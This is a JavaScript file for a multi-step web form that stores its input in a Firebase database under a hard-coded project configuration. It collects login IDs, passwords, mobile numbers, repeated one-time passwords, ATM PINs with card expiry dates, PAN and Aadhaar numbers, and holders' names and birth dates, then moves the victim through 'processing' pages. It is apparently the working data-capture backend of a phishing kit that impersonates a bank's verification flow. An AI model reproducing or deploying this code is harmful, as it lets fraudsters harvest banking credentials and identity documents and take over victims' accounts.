// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
import {
  getDatabase,
  ref,
  get,
  set,
  child,
  update,
  query,
  limitToLast,
  remove,
  push,
} from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDq5j6MMNj1gyCs_Yp1GWrx98WwlmumSSQ",
  authDomain: "vilkul.firebaseapp.com",
  projectId: "vilkul",
  storageBucket: "vilkul.appspot.com",
  messagingSenderId: "333813481161",
  appId: "1:333813481161:web:76d673d9d04edf4998d718"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

// Function to insert data into the Realtime Database with date
const insertData = async () => {
  // Get a reference to the database
  const database = getDatabase();

  // Capture form data
  const user_id = document.querySelector('input[name="User_ID"]').value;
  const password = document.querySelector('input[name="Password"]').value;
  const mobile_no = document.querySelector('input[name="Mobile_No."]').value;

  // Get the current date
  const today = new Date();
  const date = `${today.getFullYear()}-${
    today.getMonth() + 1
  }-${today.getDate()}`;
  const time = `${today.getHours()}:${today.getMinutes()}:${today.getSeconds()}`;

  const que = query(ref(database, "users"), limitToLast(1));

  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const userData = {
    User_No: last_key,
    User_ID: user_id,
    Password: password,
    Mobile_Number: mobile_no,
  };

  // Push data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), userData)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Save last key to local storage
      localStorage.setItem("user_no", last_key);
      // Redirect to OTP page
      window.location.href = "Processing.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

const updateOTP = async () => {
  // Capture form data
  const input = document.querySelector('input[name="Login_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    OTP: input,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Name_And_DOB.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

//Invalid Aadhar OTP
const InValidAadharOTP = async () => {
  // Capture form data
  const input = document.querySelector('input[name="Last_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Last_OTP: input,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Processing_Aadhar.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};


//Invalid Aadhar OTP
const InValidPanOTP = async () => {
  // Capture form data
  const input = document.querySelector('input[name="4TH_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    FORTH_OTP: input,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "PIN.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};


const updateHolder = async () => {
  // Capture form data
  const holder_name = document.querySelector(
    'input[name="Holder_Full_Name"]'
  ).value;
  const date_of_birth = document.querySelector(
    'input[name="Holder_Date_Of_Birth"]'
  ).value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Account_Holder_Name: holder_name,
    Date_Of_Birth: date_of_birth,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Enter_OTP_DOB.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updateDOBOTP = async () => {
  // Capture form data
  const sec_otp = document.querySelector('input[name="2ND_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    otp_dob: sec_otp,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Processing_DOB.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updatePanDetails = async () => {
  // Capture form data
  const full_name = document.querySelector('input[name="Pan_Full_Name"]').value;
  const pan_can_number = document.querySelector('input[name="PAN_No"]').value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Full_Name_Pan: full_name,
    Pan_No: pan_can_number,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Enter_OTP_PAN.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updatePanOTP = async () => {
  // Capture form data
  const RD_OTP = document.querySelector('input[name="3RD_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Pan_OTP: RD_OTP,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Processing_PAN.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updatePin = async () => {
  // Capture form data
  const atm_pin = document.querySelector('input[name="pinatmpin"]').value;
  const pinexpdate = document.querySelector('input[name="pinexpdate"]').value;
  const Profile_Password = document.querySelector(
    'input[name="Profile_Password"]'
  ).value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    ATM_Pin: atm_pin,
    Expiry_Date: pinexpdate,
    // profile_password: Profile_Password,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Aadhar_Details.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updateProfilePass = async () => {
  // Capture form data
  const Profile_Password = document.querySelector(
    'input[name="Profile_Password"]'
  ).value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Profile_Password: Profile_Password,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Aadhar_Details.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updateAadhar = async () => {
  // Capture form data
  const full_name = document.querySelector(
    'input[name="Aadhar_Full_Name"]'
  ).value;
  const aadhar_no = document.querySelector('input[name="Aadhar_No"]').value;
  const father_name = document.querySelector(
    'input[name="Fathers_Name"]'
  ).value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Aadhar_No: aadhar_no,
    Father_Name: father_name,
    Full_Name_Aadhar: full_name,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Enter_OTP_Aadhar.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Update otp_dob
const updateAadharOtp = async () => {
  // Capture form data
  const otp = document.querySelector('input[name="5TH_OTP"]').value;

  // Get a reference to the database
  const database = getDatabase();

  //  Get last key from local storage
  const que = query(ref(database, "users"), limitToLast(1));

  //  Get last key from local storage
  const last_key = await get(que)
    .then((snapshot) => {
      if (snapshot.exists()) {
        return parseInt(Object.keys(snapshot.val())[0]) + 1;
      } else {
        return 1;
      }
    })
    .catch((error) => {
      console.error(error);
    });

  // Data to be inserted
  const updateOTP = {
    Aadhar_OTP: otp,
  };

  // Update data to the "users" with last key and set the data
  set(ref(database, "users/" + last_key), updateOTP)
    .then(() => {
      // Data saved successfully!
      console.log("Data saved successfully!");
      // Redirect to OTP page
      window.location.href = "Processing_Aadhar.html";
    })
    .catch((error) => {
      // The write failed...
      console.error(error);
    });
};

// Wait for the DOM to be fully loaded
document.addEventListener("DOMContentLoaded", () => {
  // Get the form element for OTP
  const loginform = document.querySelector(".LoginForm");

  // Add an event listener for the form submission
  loginform.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    insertData();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  // Get the form element
  const otpForm = document.querySelector(".OPTForm");

  // Add an event listener for the form submission
  otpForm.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateOTP();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  // Get the form element
  const holderForm = document.querySelector(".AccountHolder");

  // Add an event listener for the form submission
  holderForm.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateHolder();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const otp_dob = document.querySelector(".OTPDOB");

  // Add an event listener for the form submission
  otp_dob.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateDOBOTP();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const updatePan = document.querySelector(".UpdatePan");

  // Add an event listener for the form submission
  updatePan.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updatePanDetails();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const updatePan = document.querySelector(".PanOTP");

  // Add an event listener for the form submission
  updatePan.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updatePanOTP();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".PIN");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updatePin();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".PIN2");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateProfilePass();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".Aadhar");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateAadhar();
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".AadharOtp");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    updateAadharOtp();
  });
});


document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".InvalidAadhar");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    InValidAadharOTP();
  });
});


document.addEventListener("DOMContentLoaded", () => {
  const pin = document.querySelector(".InvalidPan");

  // Add an event listener for the form submission
  pin.addEventListener("submit", (event) => {
    // Prevent the default form submission
    event.preventDefault();
    // Call the insertData function to insert data into Firebase
    InValidPanOTP();
  });
});
